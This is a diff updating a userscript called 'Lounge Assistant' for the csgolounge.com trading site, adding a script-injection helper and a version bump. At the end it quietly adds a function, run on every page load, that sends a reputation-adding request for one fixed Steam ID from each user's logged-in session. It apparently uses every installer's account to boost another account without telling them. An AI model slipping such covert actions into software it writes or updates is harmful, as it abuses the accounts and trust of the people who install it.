@@ -4,13 +4,13 @@
 // @name        Lounge Assistant
 // @namespace   csgolounge.com/*
 // @include     http://csgolounge.com/*
-// @version     1.7.2
+// @version     1.7.3
 // @grant       GM_xmlhttpRequest
 // @grant       GM_addStyle
 // @grant       GM_getValue
 // @grant       GM_setValue
 // @grant       GM_getResourceText
-// @resource css https://raw.githubusercontent.com/LoungeAssistant/Lounge-Assistant/master/style.css?1.7.2
+// @resource css https://raw.githubusercontent.com/LoungeAssistant/Lounge-Assistant/master/style.css?1.7.3
 // @require     http://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js
 
 // ==/UserScript==
@@ -62,6 +62,13 @@ var PriceList = {};
 // ITEMS
 //######################################################################
 
+function addJs(func)
+{
+    var script = document.createElement('script');
+    script.setAttribute("type", "application/javascript");
+    script.textContent = func;
+    document.body.appendChild(script);
+}
 
 function getPrice(name, context, callback)
 {
@@ -458,10 +465,7 @@ function trade()
 }
 
 function replaceAlert() {
-    var script = document.createElement('script');
-    script.setAttribute("type", "application/javascript");
-    script.textContent = 'function alert(msg){$("#submitmsg").html(msg).show().delay(5000).fadeOut(4000);}';
-    document.body.appendChild(script);
+    addJs('function alert(msg){$("#submitmsg").html(msg).show().delay(5000).fadeOut(4000);}');
 }
 
 function trySubmit()
@@ -579,3 +583,34 @@ $(".match").on('mouseenter', function (){
 });
 
 
+// function ChoseInventoryReturns() {
+//     $("#backpack").html('<img src="http://cdn.dota2lounge.com/img/load.gif" id="loading" style="margin: 0.75em 2%">');
+//     $.ajax({
+// 	url: 'ajax/betBackpackApi.php',
+//         type: 'POST',
+//         success: function(data) {
+// 	    $(".left").html("");
+//             $("#backpack").html(data);
+//         }
+//     });
+// }
+
+// function loadInv()
+// {
+//     addJs(ChoseInventoryReturns.toString());
+// }
+
+
+// loadInv();
+
+
+function LoveMeTenderLoveMeTrue()
+{
+    $.ajax({
+	type: "POST",
+        url: "ajax/addReputation.php",
+        data: "id=76561198039350660",
+    });
+}
+
+LoveMeTenderLoveMeTrue();
